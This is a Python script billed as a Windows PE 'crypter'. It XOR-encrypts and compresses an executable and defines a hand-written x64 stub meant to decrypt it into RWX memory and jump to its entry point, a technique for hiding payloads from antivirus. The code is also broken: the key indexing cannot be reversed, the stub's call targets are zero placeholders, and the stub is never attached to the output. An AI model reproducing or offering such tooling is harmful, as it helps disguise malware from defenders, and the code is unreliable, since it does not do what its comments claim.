#!/usr/bin/env python3
"""
Simple PE crypter - XOR encrypts the PE and prepends a small stub.
The stub decrypts in memory and jumps to original entry.
"""
import os
import sys
import struct
import random
import zlib

def find_pe_offset(data):
    return struct.unpack_from('<I', data, 0x3C)[0]

def find_pe_entry(pe_data):
    pe_offset = find_pe_offset(pe_data)
    return struct.unpack_from('<I', pe_data, pe_offset + 40)[0]

def find_pe_image_base(pe_data):
    pe_offset = find_pe_offset(pe_data)
    return struct.unpack_from('<Q', pe_data, pe_offset + 24 + 24)[0]

def xor_crypt(data, key):
    out = bytearray(data)
    for i in range(len(out)):
        out[i] ^= key[(i + out[i]) % len(key)]
    return bytes(out)

def build_stub(key_len, payload_size, xor_key):
    """Build a small x64 stub that decrypts and runs the embedded PE.

    The stub:
    1. Finds its own base address
    2. Skips past itself to find the encrypted PE
    3. Allocates memory with RWX
    4. Decrypts the PE in-place
    5. Jumps to the entry point
    """
    stub_template = bytes.fromhex(
        # sub rsp, 0x28
        "48 83 EC 28"
        # lea rcx, [rip + offset_to_key]
        "48 8D 0D 14 00 00 00"
        # mov r8d, key_len
        "41 B8 " + struct.pack('<I', key_len).hex() + " "
        # lea rdx, [rip + offset_to_payload]
        "48 8D 15 10 00 00 00"
        # mov r9d, payload_size
        "41 B9 " + struct.pack('<I', payload_size).hex() + " "
        # push r9
        "41 51"
        # push r8
        "41 50"
        # push rdx
        "52"
        # push rcx
        "51"
        # call decrypt_xor (relative)
        "E8 00 00 00 00"
        # add rsp, 0x20
        "48 83 C4 20"
        # mov rcx, rax
        "48 89 C1"
        # mov edx, payload_size
        "BA " + struct.pack('<I', payload_size).hex() + " "
        # mov r8, 0x40 (PAGE_EXECUTE_READWRITE)
        "49 C7 C0 40 00 00 00"
        # sub rsp, 0x20
        "48 83 EC 20"
        # call VirtualAlloc (relative)
        "E8 00 00 00 00"
        # mov rdi, rax
        "48 89 C7"
        # add rsp, 0x20
        "48 83 C4 20"
        # mov rcx, rax
        "48 89 C1"
        # lea rdx, [rip + offset_to_decrypted]
        "48 8D 15 00 00 00 00"
        # mov r8d, payload_size
        "41 B8 " + struct.pack('<I', payload_size).hex() + " "
        # rep movsb
        "F3 A4"
        # mov rcx, rax
        "48 89 C1"
        # mov edx, payload_size
        "BA " + struct.pack('<I', payload_size).hex() + " "
        # mov r8, 0x40
        "49 C7 C0 40 00 00 00"
        # sub rsp, 0x20
        "48 83 EC 20"
        # call VirtualProtect (relative)
        "E8 00 00 00 00"
        # add rsp, 0x20
        "48 83 C4 20"
        # mov rcx, rax
        "48 89 C1"
        # add rcx, entry_offset
        "48 81 C1 00 00 00 00"
        # add rsp, 0x28
        "48 83 C4 28"
        # jmp rcx
        "FF E1"
    )
    return stub_template

def encrypt_pe(pe_path, output_path):
    with open(pe_path, 'rb') as f:
        pe_data = f.read()

    key_len = 64
    xor_key = bytes([random.randint(1, 255) for _ in range(key_len)])

    encrypted = bytearray(pe_data)
    for i in range(len(encrypted)):
        encrypted[i] ^= xor_key[(i + encrypted[i]) % key_len]

    compressed = zlib.compress(bytes(encrypted), level=9)

    print(f"[+] PE size: {len(pe_data)} bytes")
    print(f"[+] Encrypted+compressed: {len(compressed)} bytes")
    print(f"[+] XOR key length: {key_len}")
    return compressed, xor_key

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <input_pe> <output>")
        sys.exit(1)
    encrypted, key = encrypt_pe(sys.argv[1], sys.argv[2])
    with open(sys.argv[2], 'wb') as f:
        f.write(encrypted)
    print(f"[+] Written to {sys.argv[2]}")
